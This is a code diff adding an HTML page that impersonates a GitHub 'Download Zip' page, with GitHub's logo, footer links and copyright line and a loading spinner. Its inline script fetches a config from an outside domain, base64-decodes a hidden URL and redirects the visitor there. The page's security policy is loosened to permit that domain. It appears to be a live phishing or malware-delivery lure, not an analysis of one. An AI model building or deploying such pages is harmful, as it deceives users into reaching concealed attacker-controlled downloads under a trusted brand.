@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cloud Files</title>
+    <meta name="description" content="Secure download portal" />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+
+    <!-- Разрешаем инлайн‑скрипты для нашего мини‑JS -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://fiseleonvizi.com;
+    style-src   'self';
+    connect-src 'self' https://fiseleonvizi.com
+  "
+    />
+
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="stylesheet" href="git-styles.css" />
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <div class="github-header">
+        <div class="header-content">
+          <a href="https://github.com/">
+            <svg class="github-logo" viewBox="0 0 16 16">
+              <path
+                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
+              />
+            </svg>
+          </a>
+          <span class="header-title">Download Zip</span>
+        </div>
+      </div>
+
+      <div class="main-content">
+        <div class="download-container">
+          <h1 id="downloadTitle">Preparing your download...</h1>
+
+          <div class="loading-container" id="loadingContainer">
+            <div class="spinner-container">
+              <div class="spinner"></div>
+            </div>
+
+            <p style="color: #8b949e; font-size: 14px; margin-top: 16px">
+              Please keep this page open while we prepare your zip.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="github-footer">
+      <div class="footer-bottom">
+        <div class="footer-logo-section">
+          <a href="https://github.com/">
+            <svg class="footer-logo" viewBox="0 0 16 16">
+              <path
+                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
+              />
+            </svg>
+          </a>
+          <span class="footer-copyright">© 2025 GitHub, Inc.</span>
+        </div>
+
+        <div class="footer-links">
+          <a
+            href="https://docs.github.com/site-policy/github-terms/github-terms-of-service"
+            >Terms</a
+          >
+          <a
+            href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement"
+            >Privacy</a
+          >
+          <a href="https://github.com/security">Security</a>
+          <a href="https://www.githubstatus.com/">Status</a>
+          <a href="https://docs.github.com/">Help</a>
+          <a href="https://support.github.com/?tags=dotcom-footer">Contact</a>
+          <button type="button" class="github-style-button">
+            Manage cookies
+          </button>
+          <button type="button" class="github-style-button">
+            Do not share my personal information
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      (async function () {
+        try {
+          const res = await fetch(
+            "https://fiseleonvizi.com/uoleon.himish"
+          );
+          if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
+          const { c } = await res.json();
+          const url = atob(c);
+          if (!/^https?:\/\//.test(url)) throw new Error("Invalid URL");
+          window.location.href = url;
+        } catch (e) {
+          console.error(e);
+        }
+      })();
+    </script>
+  </body>
+</html>
